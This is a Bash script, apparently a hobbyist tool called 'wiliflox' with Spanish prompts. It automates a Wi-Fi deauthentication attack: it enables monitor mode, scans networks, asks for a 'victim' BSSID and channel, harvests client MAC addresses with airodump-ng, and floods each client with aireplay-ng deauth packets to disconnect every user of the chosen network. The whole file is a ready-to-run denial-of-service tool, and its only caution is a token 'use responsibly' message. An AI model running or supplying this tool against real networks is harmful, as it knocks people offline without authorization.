#!/usr/bin/env bash
clear
#Zona de colores 
#by s4vitar
#------------------------------------------------------
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"
#------------------------------------------------------
#Zona de funciones
#-------------------------------------------------------
interfaz () {
	sleep 1
	clear
	clear; if [[ -e credenciales.txt ]]; then
		rm -rf credenciales.txt
	fi

	echo -e "\n${yellowColour}[*]${endColour} ${purpleColour}Listando interfaces de red disponibles...${endColour}"; sleep 1

	# Si la interfaz posee otro nombre, cambiarlo en este punto (consideramos que se llama wlan0 por defecto)
	airmon-ng start wlan0 > /dev/null 2>&1; interface=$(ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > iface)
	counter=1; for interface in $(cat iface); do
		echo -e "\t\n${blueColour}$counter.${endColour}${yellowColour} $interface${endColour}"; sleep 0.26
		let counter++
	done; tput cnorm
	checker=0; while [ $checker -ne 1 ]; do
		echo -ne "\n${yellowColour}[*]${endColour}${blueColour} Nombre de la interfaz (Ej: wlan0mon): ${endColour}" && read interface

		for interface in $(cat iface); do
			if [ "$interface" == "$interface" ]; then
				checker=1
			fi
		done; if [ $checker -eq 0 ]; then echo -e "\n${redColour}[!]${endColour}${yellowColour} La interfaz proporcionada no existe${endColour}"; fi
	done
modo_monitor

}
trap ctrl_c INT
function ctrl_c(){
	printf "\n\n${yellowColour}[*]${endColour}${grayColour} Escapando....\n${endColour}"
	sudo ifconfig $interface down
	sudo iwconfig $interface mode Managed
	sudo ifconfig $interface up
	escape
}

modo_monitor ()
{
printf "${yellowColour}[#]${endColour}${greenColour} Configurando modo monitor ${endColour}\n"
sleep 1
sudo ifconfig $interface down
sudo iwconfig $interface mode monitor
sudo ifconfig $interface up
inicio_ataque
}

olfateo ()
{
sudo airodump-ng --bssid $1 --channel $2 --write captura $interface &
sleep 5
sudo killall airodump-ng 
sleep 1
ataque
}
ataque ()
{
sleep 1
printf "${yellowColour}[>:)]${endColour}${greenColour} Desautenticando usuarios ${endColour}\n"
sleep 1
var=2
while true; do
lineas=$var
resultado="$(cat captura-01.csv | tail -n $lineas | cut -b 3 | head -n 1)"
	if [ "$resultado" = ":" ]; then
	direccion=$(cat captura-01.csv | tail -n $lineas | cut -b 1-17 | head -n 1)
	sudo aireplay-ng --deauth 1000000  -a $victima -c $direccion $interface &>/dev/null&
	else
	sleep 1
        printf "${redColour}[>:)]${endColour}${grayColour} Los usuarios fueron desautenticados ${endColour}\n"
        sleep 1
	printf "${redColour}[>:)]${endColour}${grayColour} Presione ctrl + c para salir cuando lo desee ${endColour}\n"
        sleep 1000000
	break
	fi
let "var++"

done
escape
}

inicio_ataque ()
{
sleep 1
printf "${yellowColour}[#]${endColour}${purpleColour} Escaneando redes.... ${endColour}\n"
sleep 2
sudo airodump-ng $interface &
sleep 3
sudo killall airodump-ng
printf "${yellowColour}[@]${endColour}${grayColour} Ingrese el ${purpleColiour}BSSID de su${endColour}${endColour}${redColour} victima: ${endColour}"
read victima
printf "${yellowColour}[@]${endColour}${grayColour} Ingrese el canal ${endColour}${redColour}(CH)${endColour}${grayColour} de su ${endColour}${redColour} victima: ${endColour}"
read canal
olfateo $victima $canal
}

dependencias ()
{
if [ $(command -v aircrack-ng) ]; then
sleep 1
printf "${greenColour}[*]${endColour}${grayColour} Usted posee todos los paquetes necesarios${endColour}\n"
sleep 2
interfaz
else
printf "${redColour}[!]${endColour}${grayColour} Usted no posee los paquetes necesarios${endColour}\n"
sleep 1
printf "${redColour}[!]${endColour}${grayColour} Paquetes necesarios para funcionar: ${endColour}\n"	
sleep 1
printf "${purpleColour}- net-tools${endColour}\n"
printf "${purpleColour}- aircrack-ng${endColour}\n"
sleep 2
escape
fi
}

escape ()
{
clear
printf "${greenColour}[*]${endColour}${grayColour} Muchas gracias por ocupar la herramienta wiliflox${endColour}\n"
sleep 1
printf "${greenColour}[*]${endColour}${turquoiseColour} Creador: franpro660${endColour}\n"
sleep 1
printf "${greenColour}[*]${endColour}${turquoiseColour} Agradecimientos especiales: ${endColour}\n"
sleep 1
printf "${greenColour}[*]${endColour}${blueColour} Aedes ${endColour}\n"
exit 0
}

inicio ()
{
printf "${yellowColour}[*]${endColour}${grayColour} Bienvenido a la herramienta wiliflox${endColour}\n"
sleep 1
printf "${yellowColour}[*]${endColour}${grayColour} Porfavor ejecute este comando con permisos ${endColour}${redColour}Root${endColour}${grayColour} para evitar problemas\n"
sleep 1
printf "${yellowColour}[*]${endColour}${grayColour} Esta herramienta fue hecha en bash.${endColour}\n"
sleep 1
printf "${yellowColour}[*]${endColour}${grayColour} Esta orientada a desautenticar a todos los usuarios de una red en especifico${endColour}\n"
sleep 1
printf "${redColour}[!]${endColour}${grayColour} Porfavor ocupar responsablemente${endColour}\n"
sleep 1
printf "${blueColour}[*]${endColour}${grayColour} Revisando paquetes necesarios.......${endColour}\n"
sleep 1
dependencias
}
#----------------------------------------------------
#Fin zona de funciones

#Main
#---------------------
inicio
#---------------------
#  No leas mi codigo !! >:V
#  Na leelo tranqui xd
